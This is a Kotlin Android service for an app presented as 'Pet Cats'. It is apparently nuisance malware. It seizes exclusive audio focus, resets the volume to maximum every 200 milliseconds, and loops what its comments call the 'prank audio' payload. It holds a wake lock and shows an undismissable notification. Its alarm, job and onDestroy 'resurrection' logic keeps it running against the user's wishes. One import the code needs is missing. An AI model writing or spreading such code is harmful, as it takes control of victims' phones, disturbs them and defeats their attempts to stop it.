package com.sleepy.petcats

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.media.AudioAttributes
import android.media.AudioFocusRequest
import android.media.AudioManager
import android.media.MediaPlayer
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.Process
import android.support.v4.media.MediaMetadataCompat
import android.support.v4.media.session.MediaSessionCompat
import android.support.v4.media.session.PlaybackStateCompat
import androidx.core.app.NotificationCompat
import androidx.media.app.NotificationCompat as MediaNotificationCompat

class MusicService : Service() {

    companion object {
        private const val CHANNEL_ID = "PetCatsAudio"
        private const val NOTIFICATION_ID = 1
        private const val VOLUME_ENFORCE_INTERVAL = 200L
    }

    // Player A — silent loop (keeps process alive as mediaPlayback)
    private var silentPlayer: MediaPlayer? = null

    // Player B — prank audio (the actual payload)
    private var prankPlayer: MediaPlayer? = null

    private lateinit var audioManager: AudioManager
    private lateinit var mediaSession: MediaSessionCompat
    private var wakeLock: PowerManager.WakeLock? = null
    private val handler = Handler(Looper.getMainLooper())
    private var originalVolume: Int = -1
    private var audioFocusRequest: AudioFocusRequest? = null
    private var isRunning = false

    private val volumeEnforcer = object : Runnable {
        override fun run() {
            val max = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
            audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0)
            handler.postDelayed(this, VOLUME_ENFORCE_INTERVAL)
        }
    }

    override fun onCreate() {
        super.onCreate()
        audioManager = getSystemService(AUDIO_SERVICE) as AudioManager
        createNotificationChannel()
        setupMediaSession()

        // Boost audio thread priority
        Process.setThreadPriority(Process.THREAD_PRIORITY_AUDIO)

        val pm = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "PetCats::AudioWakeLock"
        )
        wakeLock?.acquire()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, buildNotification())

        if (isRunning) return START_STICKY
        isRunning = true

        if (!requestAudioFocus()) {
            isRunning = false
            stopSelf()
            return START_NOT_STICKY
        }

        originalVolume = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC)
        val max = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0)

        handler.post(volumeEnforcer)

        // Re-arm resurrection mechanisms
        AlarmReceiver.scheduleAlarm(this)
        ResurrectJobService.schedule(this)

        startSilentLoop()
        startPrankAudio()

        return START_STICKY
    }

    private fun startSilentLoop() {
        silentPlayer?.release()
        silentPlayer = MediaPlayer.create(this, R.raw.sound).apply {
            setVolume(0f, 0f)
            isLooping = true
            start()
        }
    }

    private fun startPrankAudio() {
        prankPlayer?.release()
        prankPlayer = MediaPlayer.create(this, R.raw.sound).apply {
            isLooping = true
            start()
        }
    }

    private fun setupMediaSession() {
        mediaSession = MediaSessionCompat(this, "PetCats").apply {
            setMetadata(
                MediaMetadataCompat.Builder()
                    .putString(MediaMetadataCompat.METADATA_KEY_TITLE, "Pet Cats")
                    .putString(MediaMetadataCompat.METADATA_KEY_ARTIST, "Pet Cats")
                    .putLong(MediaMetadataCompat.METADATA_KEY_DURATION, -1L)
                    .build()
            )
            setPlaybackState(
                PlaybackStateCompat.Builder()
                    .setState(PlaybackStateCompat.STATE_PLAYING, 0L, 1f)
                    .setActions(PlaybackStateCompat.ACTION_PLAY_PAUSE)
                    .build()
            )
            isActive = true
        }
    }

    private fun requestAudioFocus(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val attrs = AudioAttributes.Builder()
                .setUsage(AudioAttributes.USAGE_MEDIA)
                .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                .build()
            val request = AudioFocusRequest
                .Builder(AudioManager.AUDIOFOCUS_GAIN_TRANSIENT_EXCLUSIVE)
                .setAudioAttributes(attrs)
                .setAcceptsDelayedFocusGain(false)
                .setOnAudioFocusChangeListener { }
                .build()
            audioFocusRequest = request
            audioManager.requestAudioFocus(request) == AudioManager.AUDIOFOCUS_REQUEST_GRANTED
        } else {
            @Suppress("DEPRECATION")
            audioManager.requestAudioFocus(
                null,
                AudioManager.STREAM_MUSIC,
                AudioManager.AUDIOFOCUS_GAIN_TRANSIENT_EXCLUSIVE
            ) == AudioManager.AUDIOFOCUS_REQUEST_GRANTED
        }
    }

    private fun abandonAudioFocus() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            audioFocusRequest?.let { audioManager.abandonAudioFocusRequest(it) }
        } else {
            @Suppress("DEPRECATION")
            audioManager.abandonAudioFocus(null)
        }
        audioFocusRequest = null
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        handler.removeCallbacksAndMessages(null)

        if (originalVolume >= 0) {
            audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, originalVolume, 0)
        }

        abandonAudioFocus()

        silentPlayer?.stop()
        silentPlayer?.release()
        silentPlayer = null

        prankPlayer?.stop()
        prankPlayer?.release()
        prankPlayer = null

        mediaSession.isActive = false
        mediaSession.release()

        if (wakeLock?.isHeld == true) wakeLock?.release()
        wakeLock = null

        // Self-resurrect
        ContextCompat.startForegroundService(
            this, Intent(this, MusicService::class.java)
        )
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Pet Cats Audio",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Pet Cats audio session"
                setShowBadge(false)
            }
            getSystemService(NotificationManager::class.java)
                .createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Pet Cats")
            .setContentText("Your cats are waiting for you…")
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setFlag(Notification.FLAG_NO_CLEAR, true)
            .setStyle(
                MediaNotificationCompat.MediaStyle()
                    .setMediaSession(mediaSession.sessionToken)
                    .setShowActionsInCompactView()
            )
            .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
            .build()
    }
}
